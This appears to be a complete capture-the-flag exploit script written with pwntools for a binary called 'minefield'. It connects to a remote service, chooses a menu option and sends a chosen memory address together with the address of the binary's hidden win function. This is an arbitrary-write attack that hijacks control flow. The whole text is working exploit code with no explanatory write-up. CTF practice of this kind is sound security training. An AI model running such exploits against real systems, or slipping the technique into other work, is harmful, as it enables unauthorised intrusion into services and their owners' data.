from pwn import *

if __name__ == "__main__":
    BIN = ELF("./minefield")
    win_func = str(BIN.symbols["_"])
    location = "6295672"

    io = remote("138.68.182.20", 31138)
    io.recvuntil("> ")
    io.sendline("2")
    io.recvuntil(": ")
    io.sendline(location)
    io.recvuntil(": ")
    io.sendline(win_func)
    print(io.recv(2048))
